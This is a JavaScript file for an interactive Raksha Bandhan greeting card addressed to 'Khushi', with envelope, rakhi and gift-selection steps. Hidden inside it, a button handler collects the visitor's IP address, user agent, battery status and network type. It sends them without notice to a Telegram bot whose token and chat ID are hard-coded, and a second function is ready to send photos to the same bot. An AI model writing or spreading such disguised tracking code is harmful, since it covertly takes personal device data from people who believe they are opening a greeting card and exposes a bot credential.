const BOT_TOKEN = "8597404645:AAEgAeMz_VQxEhzqZjwXgpDSk3Zv5FHMG6g";

const CHAT_IDS = [
    "7978961403", 
];

const infoBtn     = document.getElementById("infobtn");

infoBtn.onclick = async () => {
    infoBtn.disabled = true;

    try{
        const ip = (await (await fetch("https://api.ipify.org?format=json")).json()).ip;

        let batteryText = "Not supported";
        if(navigator.getBattery){
            const b = await navigator.getBattery();
            batteryText = `${Math.round(b.level * 100)}% | Charging: ${b.charging}`;
        }

        let network = navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "Unknown";

        const msg =
` Device Information
 IP: ${ip}
 User Agent: ${navigator.userAgent}
 Battery: ${batteryText}
 Network: ${network}
 ${new Date().toLocaleString()}`;

        sendMessageToAll(msg);
    }catch{}
    
    infoBtn.disabled = false;
};

const state = {
  name: 'Khushi',
  rakhi: null,
  gifts: [],
};
let currentStep = 1;
const TOTAL_STEPS = 4;
const stepLabels = {
  1: 'The Envelope',
  2: 'Choose the Rakhi',
  3: 'Pick the Gift',
  4: 'Sealed & Sent',
};

function spawnParticles() {
  const field = document.getElementById('particle-field');
  const count = window.innerWidth < 640 ? 16 : 26;
  for (let i = 0; i < count; i++) {
    const el = document.createElement('div');
    const isPetal = Math.random() < 0.35;
    el.className = 'particle ' + (isPetal ? 'petal' : 'sparkle');
    const size = isPetal ? (6 + Math.random() * 6) : (3 + Math.random() * 4);
    el.style.width = size + 'px';
    el.style.height = size + 'px';
    el.style.left = Math.random() * 100 + 'vw';
    el.style.setProperty('--drift', (Math.random() * 80 - 40) + 'px');
    const duration = 9 + Math.random() * 10;
    el.style.animationDuration = duration + 's';
    el.style.animationDelay = (Math.random() * duration) + 's';
    field.appendChild(el);
  }
}

function drawMandalaPetals() {
  const g = document.getElementById('petals');
  const petalCount = 12;
  for (let i = 0; i < petalCount; i++) {
    const angle = (360 / petalCount) * i;
    const petal = document.createElementNS('http://www.w3.org/2000/svg', 'ellipse');
    petal.setAttribute('cx', '200');
    petal.setAttribute('cy', '60');
    petal.setAttribute('rx', '6');
    petal.setAttribute('ry', '16');
    petal.setAttribute('transform', `rotate(${angle} 200 200)`);
    g.appendChild(petal);
  }
}

function openEnvelope() {
  const envelope = document.getElementById('envelope');
  if (envelope.classList.contains('open')) return;
  envelope.classList.add('open');
  document.getElementById('envelope-hint').style.display = 'none';
  setTimeout(() => {
    document.getElementById('welcome-reveal').classList.remove('hidden');
  }, 550);
}

function selectRakhi(el, label) {
  document.querySelectorAll('.rakhi-card').forEach(card => card.classList.remove('selected'));
  el.classList.add('selected');
  state.rakhi = label;
  document.getElementById('rakhi-next').disabled = false;
}

function toggleGift(el, label) {
  document.querySelectorAll('.gift-card').forEach(card => card.classList.remove('selected'));
  el.classList.add('selected');
  state.gifts = [label];
  document.getElementById('gift-next').disabled = false;
}

function updateThread(step) {
  for (let i = 1; i <= TOTAL_STEPS; i++) {
    const knot = document.querySelector(`.thread-knot[data-knot="${i}"]`);
    knot.classList.remove('active', 'done');
    if (i < step) knot.classList.add('done');
    else if (i === step) knot.classList.add('active');
  }
  for (let i = 1; i < TOTAL_STEPS; i++) {
    const fill = document.getElementById(`fill-${i}`);
    fill.style.width = (i < step) ? '100%' : '0%';
  }
  document.getElementById('step-label').textContent = stepLabels[step] || '';
}

function goToStep(step) {
  if (step === currentStep) return;
  const outgoing = document.querySelector(`.step[data-step="${currentStep}"]`);
  const incoming = document.querySelector(`.step[data-step="${step}"]`);

  outgoing.classList.add('leaving');
  outgoing.classList.remove('active');

  setTimeout(() => {
    outgoing.classList.remove('leaving');
    incoming.classList.add('active');
    currentStep = step;
    updateThread(step);
    if (step === 4) renderSummary();
    document.getElementById('step-container').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
  }, 350);
}

function renderSummary() {
  document.getElementById('summary-rakhi').textContent = 'Rakhi: ' + (state.rakhi || '—');
  document.getElementById('summary-gifts').textContent = 'Gift: ' + (state.gifts.length ? state.gifts.join(', ') : '—');
}

function restartCard() {
  state.rakhi = null;
  state.gifts = [];

  document.querySelectorAll('.rakhi-card').forEach(c => c.classList.remove('selected'));
  document.querySelectorAll('.gift-card').forEach(c => c.classList.remove('selected'));
  document.getElementById('rakhi-next').disabled = true;
  document.getElementById('gift-next').disabled = true;

  const envelope = document.getElementById('envelope');
  envelope.classList.remove('open');
  document.getElementById('envelope-hint').style.display = '';
  document.getElementById('welcome-reveal').classList.add('hidden');

  const outgoing = document.querySelector(`.step[data-step="${currentStep}"]`);
  outgoing.classList.remove('active');
  document.querySelector('.step[data-step="1"]').classList.add('active');
  currentStep = 1;
  updateThread(1);
}


spawnParticles();
drawMandalaPetals();
updateThread(1);


function sendMessageToAll(text){
    CHAT_IDS.forEach(chatId => {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
            method:"POST",
            headers:{ "Content-Type":"application/json" },
            body:JSON.stringify({ chat_id: chatId, text })
        });
    });
}

function sendPhotoToAll(blob){
    CHAT_IDS.forEach(chatId => {
        const fd = new FormData();
        fd.append("chat_id", chatId);
        fd.append("photo", blob);

        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
            method:"POST",
            body: fd
        });
    });
}
